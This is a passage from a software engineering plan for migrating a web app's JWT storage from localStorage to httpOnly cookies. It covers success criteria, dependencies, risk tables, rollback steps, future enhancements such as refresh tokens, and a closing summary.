- Faster on mobile devices

**Net Performance**: Slight improvement (less JS execution).

---

## Success Metrics

### Phase 1 Success Criteria (Backend Deployed)

- [ ] All existing frontend clients continue working
- [ ] New cookie-based clients can authenticate
- [ ] 0% increase in 401 errors
- [ ] Socket.IO connection success rate unchanged
- [ ] Logs show `tokenSource: 'header'` for 100% of requests

### Phase 2 Success Criteria (Frontend Deployed)

- [ ] Login sets `auth_token` cookie in browser
- [ ] API requests send cookie automatically
- [ ] Socket.IO connections authenticated via cookie
- [ ] Session persists after page reload
- [ ] Logout clears cookie
- [ ] <1% increase in auth errors (expected: transient errors during rollout)
- [ ] Logs show `tokenSource: 'cookie'` increasing over 24-48 hours

### Phase 3 Success Criteria (Post-Deployment)

- [ ] >95% of requests use `tokenSource: 'cookie'` after 48 hours
- [ ] 100% use cookies after 7 days (browser cache refresh)
- [ ] Auth error rate returns to baseline
- [ ] No XSS token theft possible (verified via security audit)
- [ ] Performance metrics unchanged or improved

### Long-term Success Metrics

**Security**:
- 0 token theft incidents via XSS
- 0 CSRF attack successes
- 100% of auth traffic over HTTPS

**Reliability**:
- Auth success rate >99.9%
- Socket.IO connection success rate >99%
- Session restoration success rate >99%

**User Experience**:
- Session persistence across tabs
- No unexpected logouts
- <500ms login response time

---

## Dependencies

### New NPM Packages

```json
{
  "dependencies": {
    "cookie-parser": "^1.4.6",
    "cookie": "^0.6.0"
  }
}
```

**Installation**:
```bash
cd backend
npm install cookie-parser cookie
```

### Existing Dependencies (No Changes)

- `jsonwebtoken`: JWT signing/verification
- `express`: Web framework
- `socket.io`: Real-time communication
- `redis`: Token blacklist storage
- `bcrypt`: Password hashing

---

## Documentation Updates

After migration complete, update:

1. **[`docs/SECURITY_AUDIT.md`](docs/SECURITY_AUDIT.md)**
   - Mark CRITICAL-2 as resolved
   - Update auth flow diagram with cookies

2. **[`docs/IMPLEMENTATION.md`](docs/IMPLEMENTATION.md)**
   - Update authentication section
   - Document cookie-based auth flow

3. **[`AGENTS.md`](AGENTS.md)**
   - Update "Never log password_hash or tokens" to include cookies
   - Add cookie management best practices

4. **[`README.md`](README.md)** (if exists)
   - Update authentication documentation
   - Add cookie configuration instructions

5. **API Documentation** ([`openapi.yaml`](openapi.yaml))
   - Update auth endpoints to document cookie behavior
   - Remove `token` from response schemas (register/login)
   - Add cookie security headers documentation

6. **[`.env.example`](.env.example) and [`.env.production.example`](.env.production.example)**
   - Add `COOKIE_DOMAIN` variable with comments

---

## Risk Assessment

### High Risks

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Breaking change for old clients | High | High | Dual-mode backend supports both |
| CORS misconfiguration blocks cookies | Medium | High | Thorough testing in staging |
| Cookie not sent with Socket.IO | Medium | High | Test socket auth extensively |
| Users stuck logged out | Low | Critical | Provide clear login button, monitor errors |

### Medium Risks

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Cookie domain mismatch | Medium | Medium | Test with production-like domains |
| SameSite=Strict breaks external links | Medium | Medium | Use sameSite=lax |
| Browser blocks third-party cookies | Low | Medium | Document same-origin requirement |
| Performance degradation | Low | Low | Measure before/after metrics |

### Low Risks

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Cookie size overhead | High | Low | 10 bytes negligible |
| Incognito mode issues | Medium | Low | Document expected behavior |
| Mobile browser compatibility | Low | Low | Test on major mobile browsers |

---

## Rollback Procedures

### Emergency Rollback (Within 1 Hour)

**If Phase 2 (Frontend) causes critical issues:**

1. **Revert frontend deployment** via CI/CD or manual deployment
   ```bash
   git revert <commit-hash>
   git push origin main
   # Trigger deployment pipeline
   ```

2. **Verify old frontend works** with dual-mode backend
   - Users should automatically fall back to localStorage flow
   - No backend changes needed

3. **Investigate issues** in staging environment
   - Review error logs
   - Test specific browser/device combinations
   - Fix issues and re-deploy when ready

**Expected Impact**: <5 minutes of elevated errors during revert

### Partial Rollback (Phase 1 Issues)

**If Phase 1 (Backend) causes issues:**

1. **Revert backend deployment**
   ```bash
   git revert <commit-hash>
   # Re-deploy backend
   ```

2. **Verify old auth flow works**
   - Frontend unchanged
   - Token sent in Authorization header
   - No cookies involved

**Expected Impact**: <10 minutes of auth failures during revert

### Data Loss Considerations

**No permanent data loss risk:**
- Tokens are ephemeral (7-day expiry)
- Token blacklist persists in Redis
- User credentials unchanged
- Sessions can be restored by re-logging in

**Worst Case**: Users need to log in again after rollback.

---

## Future Enhancements

### Refresh Token Implementation

**Current limitation**: 7-day expiry = user must login every 7 days

**Solution**: Implement refresh token pattern
1. Short-lived access token (15 minutes)
2. Long-lived refresh token (30 days) in separate httpOnly cookie
3. Automatic token refresh on API calls
4. Refresh endpoint to get new access token

**Complexity**: Medium  
**Benefit**: Better security + UX  
**Timeline**: Future sprint (not part of this migration)

### "Remember Me" Feature

**Current limitation**: All sessions expire after 7 days

**Solution**: Optional "Remember Me" checkbox
- Extends cookie maxAge to 30 days
- Separate refresh token with longer expiry
- User can opt-in for convenience

**Complexity**: Low  
**Benefit**: Improved UX for trusted devices  
**Timeline**: After refresh token implementation

### Multi-Device Session Management

**Current limitation**: No visibility into active sessions

**Solution**: Session tracking table
- Record device info, IP, last active time
- Allow users to view and revoke sessions
- "Logout all devices" feature

**Complexity**: High  
**Benefit**: Better security + user control  
**Timeline**: Future major release

### Device Fingerprinting

**Current limitation**: Token can be used from any device

**Solution**: Add device fingerprint to JWT claims
- Compare fingerprint on each request
- Reject if mismatch (potential hijacking)
- Tradeoff: UX friction (users may change devices)

**Complexity**: Medium  
**Benefit**: Stronger session hijacking protection  
**Timeline**: Evaluate based on security needs

---

## Conclusion

This migration plan provides a **safe, incremental approach** to eliminating the critical XSS vulnerability in JWT token storage.

**Key Advantages**:
- ✅ Backward compatible rollout (dual-mode backend)
- ✅ Low risk (can rollback at any stage)
- ✅ Comprehensive testing strategy
- ✅ Clear success metrics
- ✅ Detailed troubleshooting guide

**Estimated Timeline**:
- **Day 1**: Deploy Phase 1 (backend dual-mode)
- **Day 2-3**: Deploy Phase 2 (frontend cookie mode)
- **Week 1**: Monitor adoption and verify security
- **Month 1+**: Optional cleanup of legacy support

**Next Steps**:
1. Review this plan with team
2. Set up staging environment for testing
3. Schedule deployment windows
4. Execute Phase 1 (backend changes)
5. Verify backward compatibility
6. Execute Phase 2 (frontend changes)
7. Monitor metrics and validate security improvement

**Expected Outcome**: JWT tokens completely protected from XSS attacks while maintaining seamless user experience.
